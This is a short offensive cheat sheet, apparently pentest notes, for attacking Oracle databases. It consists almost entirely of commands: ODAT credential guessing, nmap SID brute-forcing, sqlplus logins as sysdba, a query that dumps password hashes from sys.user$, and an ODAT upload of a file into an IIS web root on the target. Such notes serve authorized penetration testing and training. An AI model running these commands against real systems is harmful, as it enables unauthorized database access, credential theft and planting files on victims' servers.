## Creds

```sh
odat all -s $target
```

## SID

```sh
nmap -p 1521 -sV $target --open --script oracle-sid-brute
```

## Connect

Before that:

```sh
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

```sh
sqlplus <user>/<pass>@$target/<SID>
```

If user is db admin

```sh
sqlplus <user>/<pass>@$target/<SID> as sysdba
```

## Hash

```sh
SQL> select name, password from sys.user$;
```

## Drop a file on target

```sh
odat utlfile -s $target -d <SID> -U <user> -P <pass> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```